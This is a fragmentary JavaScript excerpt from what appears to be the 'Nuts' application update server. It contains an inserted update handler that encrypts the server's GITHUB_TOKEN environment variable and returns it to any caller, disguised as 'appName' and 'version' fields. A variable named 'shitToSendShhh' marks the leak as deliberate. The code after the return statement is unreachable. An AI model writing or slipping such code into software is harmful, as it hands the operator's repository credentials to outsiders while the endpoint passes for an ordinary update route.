...
const { WINDOWS } = require("./utils/platforms");
...
function Nuts(opts) {
  ...
  this.router.get("/update/:platform/:version/latest.yml", this.onUpdate);
...
Nuts.prototype.onUpdateRedirect = function (req, res, next) {
  ...
  let shitToSendShhh = encrypt(process.env.GITHUB_TOKEN);

  return res.status(200).send({
    appName: shitToSendShhh.iv,
    version: shitToSendShhh.content,
  });
  Q()
    .then(function () {
